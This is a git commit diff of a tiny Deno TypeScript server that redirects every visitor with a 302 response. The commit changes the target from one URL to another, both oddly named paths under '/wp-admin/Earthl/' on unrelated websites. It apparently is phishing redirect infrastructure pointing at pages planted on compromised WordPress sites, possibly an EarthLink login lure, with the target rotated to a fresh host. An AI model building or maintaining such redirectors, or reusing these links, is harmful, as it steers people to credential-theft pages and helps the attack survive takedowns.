925b9c5c142686ea41f6dde038690b7c01298a82
Digital2025001 <bosmichael30@gmail.com>
2025-09-19 02:09:44 -0700

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://lasikleaders.org/wp-admin/Earthl/_+_==/", // Replace this with your actual link
+      Location: "https://mathieu-mariac-smartcover.comhit.fr/wp-admin/Earthl/_+_==/", // Replace this with your actual link
     },
   });
 });
